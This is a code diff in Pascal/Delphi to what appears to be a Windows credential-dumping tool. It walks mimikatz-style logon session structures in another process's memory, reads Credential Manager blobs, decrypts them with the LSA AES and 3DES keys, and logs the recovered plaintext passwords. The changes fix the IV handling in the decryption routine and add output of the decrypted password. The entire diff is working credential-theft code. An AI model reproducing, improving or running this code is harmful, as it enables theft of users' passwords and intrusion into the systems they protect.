@@ -262,6 +262,7 @@ const
 var
   cbIV,i:ulong;
   status:ntstatus;
+  tempiv:tbytes;
 begin
   //fillchar(decrypted,sizeof(decrypted),0); //will nullify the array?
   for i:=0 to length(decrypted)-1 do decrypted[i]:=0;
@@ -271,7 +272,9 @@ begin
 		cbIV := sizeof(iv);
                 log('cbmemory:'+inttostr(cbmemory));
                 log('aes encrypted:'+ByteToHexaString (encrypted));
-                if bdecrypt(BCRYPT_AES_ALGORITHM,encrypted,@decrypted[0],aeskey,iv)>0 then result:=true;
+                setlength(tempiv,length(iv));
+                copymemory(@tempiv[0],@iv[0],length(tempiv));
+                if bdecrypt(BCRYPT_AES_ALGORITHM,encrypted,@decrypted[0],aeskey,tempiv)>0 then result:=true;
 
         end
 	else
@@ -280,7 +283,9 @@ begin
 		cbIV := sizeof(iv) div 2;
                 log('cbmemory:'+inttostr(cbmemory));
                 log('des encrypted:'+ByteToHexaString (encrypted));
-                if bdecrypt(BCRYPT_3DES_ALGORITHM,encrypted,@decrypted[0],deskey,iv)>0 then result:=true;
+                setlength(tempiv,length(iv));
+                copymemory(@tempiv[0],@iv[0],length(tempiv));
+                if bdecrypt(BCRYPT_3DES_ALGORITHM,encrypted,@decrypted[0],deskey,tempiv)>0 then result:=true;
         end;
 
 end;
@@ -867,11 +872,11 @@ begin
                                    //
                                    log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
                                    //
-                                   log('CredentialManager:'+inttohex(nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager),sizeof(pvoid)),1);
                                    credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager);
+                                   log('CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
                                    if Credentials<>0 then
                                      begin
-                                     //_generic_list
+                                     //CredentialManager
                                      ReadMem  (hprocess,credentials,bytes);
                                      log(inttohex(Pgeneric_list (@bytes[0]).unk4  ,sizeof(nativeuint)),1);
                                      ReadMem  (hprocess,Pgeneric_list (@bytes[0]).unk4,bytes);
@@ -883,12 +888,21 @@ begin
                                      //encrypted password is $e0 aka 224 bytes later
                                      //start of credential structure is -$58
                                      //password - $110 is the pointed to the password
+                                     if CREDENTIALW.CredentialBlobSize>0 then
+                                     begin
                                      setlength(password,CREDENTIALW.CredentialBlobSize);
                                      ReadMem  (hprocess,nativeuint(CREDENTIALW.CredentialBlob),password );
-                                     setlength(decrypted,1024);
-                                     decryptLSA (CREDENTIALW.CredentialBlobSize,password,decrypted);
-                                     log(BytetoAnsiString(decrypted),1);
-                                     end;
+                                     //log(ByteToHexaString(password),1);
+                                     setlength(decrypted,255);
+                                             if decryptLSA (CREDENTIALW.CredentialBlobSize,password,decrypted)=false
+                                             then log('decryptLSA NOT OK',1)
+                                             else
+                                             begin
+                                             log(strpas (pwidechar(@decrypted[0]) ),1);
+                                             //log(BytetoAnsiString(decrypted),1);
+                                             end;
+                                     end;//if CREDENTIALW.CredentialBlobSize>0 then
+                                     end; //if Credentials<>0 then
                                    //
                                    credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
                                    log('CredentialsPtr:'+inttohex(credentials,sizeof(pointer))) ;
